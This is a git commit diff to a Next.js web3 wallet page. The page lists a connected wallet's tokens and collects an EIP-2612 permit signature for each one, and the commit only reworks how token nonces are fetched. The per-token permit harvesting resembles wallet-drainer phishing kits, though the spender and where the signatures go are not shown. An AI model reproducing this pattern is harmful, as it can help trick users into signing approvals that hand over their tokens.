bcdfecc6d04e258c162ddfaa1af9c9f41e5ecf0f
FAZEL UNITY <53996181+fazelunity0054@users.noreply.github.com>
2024-05-30 04:19:55 +0330

    update app/page.tsx

--- src/app/page.tsx
+++ src/app/page.tsx
@@ -25,14 +25,13 @@ const Page = () => {
 	const account = useAccount();
 	const {disconnect} = useDisconnect();
 	const provider = useEthersProvider();
-
+	
 	const [signatures, setSignatures] = useState<{
 		[key: string]: Awaited<ReturnType<typeof createPermitSignature>>
 	}>({})
 	const {data: balance, isLoading} = useBalance({
 		address: account.address,
 	})
-	const signer = useEthersSigner()
 	const [tokens, setTokens] = useState<ContractCovalenTHQ[]>([]);
 
 	if (isLoading) return "LOADING";
@@ -72,9 +71,9 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-							const nonce = (await callContractMethod('nonces', [account.address, {
-								gasLimit: 100000
-							}], token.contract_address,signer)).toString();
+							const nonce = (await callContractMethod('nonces', [account.address], token.contract_address,
+								//@ts-ignore
+								provider.connection.url+"")).toString();
 							const sig = await createPermitSignature(async (args: any)=>{
 								return signTypedData(config, args);
 							},
